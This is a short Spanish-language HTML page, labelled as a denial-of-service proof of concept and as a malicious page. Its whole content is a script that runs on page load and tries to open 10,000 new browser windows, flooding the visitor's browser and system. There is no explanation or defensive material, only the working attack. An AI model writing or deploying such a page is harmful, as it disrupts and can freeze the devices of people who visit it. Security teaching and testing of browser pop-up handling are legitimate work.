<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <title>Prueba de Concepto - Denegación de Servicio</title>
</head>
<body>
  <h1>Prueba de Concepto - Denegación de Servicio</h1>
  <h1>Atención Página Web Maliciosa</h1>

<script>
window.onload = function() {

  const MAX = 10000;
  for (let i = 0; i < MAX; i++) {
    window.open("index.php", "_blank", "width=1024,height=768");
  }
};
</script>
</body>
</html>
